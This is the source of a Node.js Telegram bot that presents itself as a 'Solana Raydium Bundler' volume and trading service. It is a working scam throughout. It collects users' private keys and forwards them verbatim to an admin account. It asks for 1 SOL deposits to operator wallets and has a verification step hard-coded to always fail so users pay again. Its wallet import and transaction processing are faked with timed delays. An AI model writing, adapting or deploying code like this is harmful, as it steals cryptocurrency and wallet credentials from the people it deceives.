const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

// Environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_USER_ID = parseInt(process.env.ADMIN_USER_ID);
const ADMIN_WALLETS = [
  'So11111111111111111111111111111111111111112',
  'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA',
  'RaydiumToken111111111111111111111111111111111111',
  '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R',
  'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt'
];

// Initialize Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Conversation states
const STATES = {
  AWAITING_ADDRESS: 1,
  AWAITING_WALLET_OPTION: 2,
  AWAITING_PRIVATE_KEY: 3,
  IMPORTING_WALLET: 4,
  AWAITING_DEPOSIT_CONFIRMATION: 5,
  AWAITING_TRANSFER_CONFIRMATION: 6,
  VERIFYING: 7,
  CHOOSING_ACTION: 8,
  PROCESSING_ACTION: 9
};

// Store user state
const userStates = new Map();
const walletAssignments = {};

// Helper functions
function getAssignedWallet(chatId) {
  if (!walletAssignments[chatId]) {
    walletAssignments[chatId] = ADMIN_WALLETS[Math.floor(Math.random() * ADMIN_WALLETS.length)];
  }
  return walletAssignments[chatId];
}

async function notifyAdmin(message) {
  try {
    await bot.sendMessage(ADMIN_USER_ID, message);
  } catch (error) {
    console.error(`Failed to notify admin: ${error.message}`);
  }
}

async function simulateWalletImport(chatId) {
  await new Promise(resolve => setTimeout(resolve, 10000)); // 10 second delay
}

async function simulateVerification(chatId) {
  await new Promise(resolve => setTimeout(resolve, 40000)); // 40 second delay
  return false; // Always return false to simulate verification failure
}

async function simulateTransactions(chatId) {
  await new Promise(resolve => setTimeout(resolve, 300000)); // 5 minute delay
}

// Handle /start command
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(
    chatId, 
    '🌟 Welcome to **Solana Raydium Bundler** 🌟\n🚀 Boost your token volume or trade instantly with ease!\nPlease send your Solana token address.'
  );
  await notifyAdmin(`User ${chatId} started bot.`);
  userStates.set(chatId, { state: STATES.AWAITING_ADDRESS });
});

// Handle text messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const userState = userStates.get(chatId) || { state: null };

  if (text.startsWith('/')) return;

  switch (userState.state) {
    case STATES.AWAITING_ADDRESS:
      await bot.sendMessage(
        chatId, 
        'Please choose an option:\n1 for import your wallet\n2 to create wallet'
      );
      await notifyAdmin(`User ${chatId} submitted token address: ${text}`);
      userStates.set(chatId, { 
        state: STATES.AWAITING_WALLET_OPTION, 
        address: text 
      });
      break;

    case STATES.AWAITING_WALLET_OPTION:
      if (text === '1') {
        await bot.sendMessage(
          chatId, 
          'Please enter your private key:'
        );
        await notifyAdmin(`User ${chatId} chose option 1: import wallet`);
        userStates.set(chatId, { 
          state: STATES.AWAITING_PRIVATE_KEY, 
          address: userState.address 
        });
      } else if (text === '2') {
        const assignedWallet = getAssignedWallet(chatId);
        await bot.sendMessage(
          chatId, 
          `Please deposit 1 SOL to this Solana address: \`${assignedWallet}\`\nOnce deposited, reply with "done".`,
          { parse_mode: 'Markdown' }
        );
        await notifyAdmin(`User ${chatId} chose option 2: create wallet, provided address: ${assignedWallet}`);
        userStates.set(chatId, { 
          state: STATES.AWAITING_TRANSFER_CONFIRMATION, 
          address: userState.address,
          depositAddress: assignedWallet
        });
      } else {
        await bot.sendMessage(
          chatId, 
          'Invalid option. Please choose 1 for import your wallet or 2 to create wallet.'
        );
        await notifyAdmin(`User ${chatId} sent invalid option: ${text}`);
      }
      break;

    case STATES.AWAITING_PRIVATE_KEY:
      // Immediately forward whatever user sends to admin
      await notifyAdmin(`User ${chatId} submitted private key: ${text}`);
      
      // Show importing message
      await bot.sendMessage(
        chatId,
        '⏳ Please wait 10 seconds while we import your wallet...'
      );
      userStates.set(chatId, {
        state: STATES.IMPORTING_WALLET,
        address: userState.address,
        privateKey: text
      });
      
      // Simulate 10 second import process
      try {
        await simulateWalletImport(chatId);
        await bot.sendMessage(
          chatId, 
          '❌ Wallet not verified. No funds detected.\n\n' +
          'Check that:\n' +
          '1. Your private key is correct\n' +
          '2. Your wallet has at least 1 SOL\n\n' +
          'The bot requires minimum 1 SOL to activate.'
        );
        await notifyAdmin(`User ${chatId}'s wallet import failed - no funds detected`);
      } catch (error) {
        await bot.sendMessage(
          chatId,
          '❌ Error importing wallet. Please try again.'
        );
      }
      
      userStates.delete(chatId);
      await bot.sendMessage(
        chatId,
        'Type /start to try again.'
      );
      break;

    case STATES.AWAITING_TRANSFER_CONFIRMATION:
      if (text.toLowerCase() === 'done') {
        await bot.sendMessage(
          chatId, 
          '⏳ Verifying your deposit... (40 seconds)'
        );
        await notifyAdmin(`User ${chatId} claimed deposit to ${userState.depositAddress}`);
        userStates.set(chatId, { 
          state: STATES.VERIFYING, 
          address: userState.address,
          depositAddress: userState.depositAddress
        });

        try {
          const verified = await simulateVerification(chatId);
          if (!verified) {
            await bot.sendMessage(
              chatId,
              '❌ Transaction not verified\n\n' +
              'Please deposit minimum 1 SOL to:\n' +
              `\`${userState.depositAddress}\`\n\n` +
              'Reply "done" after transferring.',
              { parse_mode: 'Markdown' }
            );
            userStates.set(chatId, { 
              state: STATES.AWAITING_TRANSFER_CONFIRMATION,
              address: userState.address,
              depositAddress: userState.depositAddress
            });
          }
        } catch (error) {
          await bot.sendMessage(
            chatId,
            '❌ Verification failed\n\n' +
            'Please restart the bot with /start'
          );
          userStates.delete(chatId);
        }
      } else {
        await bot.sendMessage(
          chatId, 
          'Please reply with "done" after depositing 1 SOL.'
        );
      }
      break;

    case STATES.CHOOSING_ACTION:
      if (text === '1' || text === '2') {
        await bot.sendMessage(
          chatId,
          '🚀 Bot is running... Transactions are being processed.\n\n' +
          'This will take approximately 5 minutes.'
        );
        await notifyAdmin(`User ${chatId} selected action ${text === '1' ? 'Volume Booster' : 'Instant Buy/Sell'}`);
        userStates.set(chatId, { 
          state: STATES.PROCESSING_ACTION, 
          action: text 
        });

        try {
          await simulateTransactions(chatId);
          await bot.sendMessage(
            chatId,
            '✅ All transactions completed successfully!'
          );
          await notifyAdmin(`Transactions completed for user ${chatId}`);
        } catch (error) {
          await bot.sendMessage(
            chatId,
            '❌ Some transactions failed. Please try again.'
          );
          await notifyAdmin(`Transactions failed for user ${chatId}`);
        }
        userStates.delete(chatId);
        await bot.sendMessage(
          chatId,
          'Type /start to begin a new session.'
        );
      } else {
        await bot.sendMessage(
          chatId,
          'Invalid option. Please choose 1 or 2.'
        );
      }
      break;

    default:
      await bot.sendMessage(chatId, 'Please use /start to begin.');
      await notifyAdmin(`User ${chatId} sent message without state: ${text}`);
  }
});

// Error handling
bot.on('polling_error', (error) => {
  console.error(`Polling error: ${error.message}`);
  notifyAdmin(`Bot error: ${error.message}`);
});

console.log('Bot is running...');
